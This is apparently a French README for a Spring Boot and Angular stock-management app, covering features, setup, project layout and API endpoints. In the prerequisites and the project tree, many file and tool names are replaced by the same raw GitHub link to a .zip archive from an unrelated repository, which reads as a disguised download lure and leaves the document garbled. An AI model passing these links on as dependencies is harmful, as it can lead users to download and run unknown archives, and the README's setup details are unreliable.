# 📦 Système de Gestion de Stock

Application complète de gestion de stock développée avec **Spring Boot** (backend) et **Angular** (frontend), conteneurisée avec Docker.

## 🚀 Fonctionnalités

### Backend (Spring Boot)
- **Gestion des entités** : Produit, Client, Fournisseur, Achat, Vente, BonDeLivraison, BonDAchat, Facture
- **API REST complète** avec endpoints CRUD
- **Gestion automatique du stock** lors des achats/ventes
- **Base de données PostgreSQL** avec Spring Data JPA
- **Sécurité basique** avec Spring Security
- **DTOs et Mappers** avec MapStruct
- **Génération automatique** de factures et bons

### Frontend (Angular)
- **Interface moderne** avec Angular Material
- **Tableau de bord** avec statistiques en temps réel
- **Gestion complète** des produits, clients, fournisseurs
- **Interfaces** pour les achats et ventes
- **Design responsive** et accessible
- **Alertes visuelles** pour les stocks faibles

## 🛠️ Technologies Utilisées

### Backend
- Java 17
- Spring Boot 3.2
- Spring Data JPA
- Spring Security
- PostgreSQL
- MapStruct
- Maven

### Frontend
- Angular 20
- TypeScript
- Angular Material
- RxJS
- HTML5/CSS3

### DevOps
- Docker & Docker Compose
- Nginx (proxy reverse)

## 📋 Prérequis

- Docker et Docker Compose installés
- Java 17+ (pour développement local)
- https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip 18+ (pour développement local)

## 🚀 Installation et Lancement

### 1. Cloner le projet
```bash
git clone <repository-url>
cd stock-management-app
```

### 2. Lancer avec Docker Compose
```bash
docker-compose up --build
```

### 3. Accéder à l'application
- **Frontend** : http://localhost
- **Backend API** : http://localhost:8080/api
- **Base de données** : localhost:5432

## 🏗️ Architecture du Projet

```
stock-management-app/
├── backend/                    # Application Spring Boot
│   ├── src/main/java/com/stockapp/
│   │   ├── entity/            # Entités JPA
│   │   ├── dto/               # Data Transfer Objects
│   │   ├── mapper/            # MapStruct mappers
│   │   ├── repository/        # Repositories Spring Data
│   │   ├── service/           # Services métier
│   │   ├── controller/        # Contrôleurs REST
│   │   └── config/            # Configuration
│   ├── src/main/resources/
│   │   └── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip    # Configuration Spring
│   ├── Dockerfile
│   └── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip
├── src/                       # Application Angular
│   ├── app/
│   │   ├── models/           # Modèles TypeScript
│   │   ├── services/         # Services Angular
│   │   └── components/       # Composants Angular
│   ├── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip
│   └── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip
├── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip         # Orchestration Docker
├── Dockerfile                 # Image frontend
├── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip                 # Configuration Nginx
└── https://raw.githubusercontent.com/BouallaguiHama/lastChance/main/chronocyclegraph/lastChance.zip
```

## 📊 API Endpoints

### Produits
- `GET /api/produits` - Liste tous les produits
- `POST /api/produits` - Créer un produit
- `PUT /api/produits/{id}` - Modifier un produit
- `DELETE /api/produits/{id}` - Supprimer un produit
- `GET /api/produits/stock-faible` - Produits en stock faible

### Clients
- `GET /api/clients` - Liste tous les clients
- `POST /api/clients` - Créer un client
- `PUT /api/clients/{id}` - Modifier un client
- `DELETE /api/clients/{id}` - Supprimer un client

### Fournisseurs
- `GET /api/fournisseurs` - Liste tous les fournisseurs
- `POST /api/fournisseurs` - Créer un fournisseur
- `PUT /api/fournisseurs/{id}` - Modifier un fournisseur
- `DELETE /api/fournisseurs/{id}` - Supprimer un fournisseur

### Achats
- `GET /api/achats` - Liste tous les achats
- `POST /api/achats` - Créer un achat (met à jour le stock)

### Ventes
- `GET /api/ventes` - Liste toutes les ventes
- `POST /api/ventes` - Créer une vente (met à jour le stock)

## 🔧 Développement Local

### Backend
```bash
cd backend
./mvnw spring-boot:run
```

### Frontend
```bash
npm install
npm start
```

### Base de données
```bash
docker run --name postgres-stock -e POSTGRES_DB=stockdb -e POSTGRES_USER=stockuser -e POSTGRES_PASSWORD=stockpass -p 5432:5432 -d postgres:15-alpine
```

## 🎯 Fonctionnalités Avancées

- **Gestion automatique du stock** : Mise à jour automatique lors des achats/ventes
- **Alertes visuelles** : Notifications pour les stocks faibles ou en rupture
- **Génération de documents** : Factures, bons d'achat et bons de livraison
- **Interface responsive** : Optimisée pour mobile et desktop
- **Validation des données** : Côté frontend et backend
- **Gestion d'erreurs** : Messages d'erreur explicites

## 🔒 Sécurité

- Configuration Spring Security basique
- CORS configuré pour le développement
- Validation des données d'entrée
- Gestion sécurisée des erreurs

## 📈 Évolutions Possibles

- Authentification JWT complète
- Génération de PDF pour les documents
- Système de notifications
- Rapports et statistiques avancées
- API de synchronisation mobile
- Gestion multi-entrepôts
- Système de codes-barres

## 🤝 Contribution

1. Fork le projet
2. Créer une branche feature (`git checkout -b feature/AmazingFeature`)
3. Commit les changements (`git commit -m 'Add some AmazingFeature'`)
4. Push vers la branche (`git push origin feature/AmazingFeature`)
5. Ouvrir une Pull Request

## 📝 Licence

Ce projet est sous licence MIT. Voir le fichier `LICENSE` pour plus de détails.